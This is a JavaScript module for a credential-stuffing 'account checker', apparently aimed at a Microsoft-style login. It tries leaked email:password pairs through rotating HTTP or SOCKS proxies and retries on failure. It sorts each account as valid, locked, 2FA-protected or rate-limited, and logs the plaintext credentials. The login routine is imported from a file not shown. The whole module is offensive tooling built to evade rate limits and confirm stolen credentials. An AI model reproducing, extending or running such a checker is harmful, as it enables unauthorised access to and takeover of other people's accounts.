import { login_func } from './login.js';
import { CookieJar } from 'tough-cookie';
import got from 'got';
import { SocksProxyAgent } from 'socks-proxy-agent';
import { HttpsProxyAgent } from 'https-proxy-agent';
import { Log } from './logger.js';

async function worker(session, email, password) {
    try {
        const login = await login_func(session, email, password)
        if (login.status == "already_connected") {
            Log.Success(`Valid account! | ${email}:${password}`)
            return {status: "success", domain_list: null, access_token: null, response: null}
        }else if (login.status == "success") {
            Log.Success(`Valid account! | ${email}:${password}`)
            return {status: "success", domain_list: null, access_token: null, response: null}
        }else{
            return {status: login.status, domain_list: null, access_token: null, response: null}
        }
    } catch (error) {
        return {status: "retry", domain_list: null, access_token: null, response: error}
    }
}

async function checkAccount(email, password, proxy = null, proxyType = 'http', retryLimit = 1) {
    let retry_count = 0;
    
    while (retry_count <= retryLimit) {
        retry_count++;
        
        try {
            let proxyAgent = null;
            
            if (proxy) {
                let proxy_url;
                if (proxyType.toLowerCase().includes("socks")) {
                    proxy_url = `${proxyType.toLowerCase()}://${proxy}`;
                    proxyAgent = new SocksProxyAgent(proxy_url);
                } else {
                    proxy_url = `${proxyType.toLowerCase()}://${proxy}`;
                    proxyAgent = new HttpsProxyAgent(proxy_url);
                }
            }

            const cookieJar = new CookieJar();
            const session = got.extend({
                cookieJar,
                agent: proxyAgent ? {
                    https: proxyAgent
                } : undefined,
                timeout: {
                    request: 30000
                }
            });

            const status = await worker(session, email, password);
            
            if (status.status == "success") {
                Log.Success(`Valid account | ${email}:${password}`)
                return { status: "valid", account: `${email}:${password}` };
            } else if (status.status == "locked") {
                Log.Debug(`Locked account | ${email}:${password}`)
                return { status: "locked", account: `${email}:${password}` };
            } else if (status.status == "2fa_detected") {
                Log.Debug(`2fa detected | ${email}:${password}`)
                return { status: "2fa", account: `${email}:${password}` };
            } else if (status.status == "invalid") {
                Log.Debug(`Invalid account | ${email}:${password}`)
                return { status: "invalid", account: `${email}:${password}` };
            } else if (status.status == "passkey_interrupt") {
                Log.Warning(`Passkey interrupt happened, need to retry ${email}:${password}`)
                // Continue retry loop
            } else if (status.status == "recovery") {
                Log.Debug(`Locked account (Recovery) | ${email}:${password}`)
                return { status: "locked", account: `${email}:${password}`, details: "Recovery" };
            } else if (status.status == "security_info_change") {
                Log.Debug(`Locked account (security info change pending) | ${email}:${password}`)
                return { status: "locked", account: `${email}:${password}`, details: "Security info change pending" };
            } else if (status.status == "too_many_tries") {
                Log.Debug(`Too many tries (login blocked) | ${email}:${password}`)
                return { status: "locked", account: `${email}:${password}`, details: "Too many tries (login blocked)" };
            } else {
                Log.Error(`Proxy timeout error`);
                // Continue retry loop
            }
            
            if (status.status !== "retry" && status.status !== "passkey_interrupt") {
                break;
            }
        } catch (error) {
            Log.Error(`Error checking ${email}: ${error.message}`);
            if (retry_count > retryLimit) {
                return { status: "failed", account: `${email}:${password}`, error: error.message };
            }
        }
    }
    
    if (retry_count > retryLimit) {
        return { status: "failed", account: `${email}:${password}` };
    }
    
    return { status: "failed", account: `${email}:${password}` };
}

export {
    checkAccount
};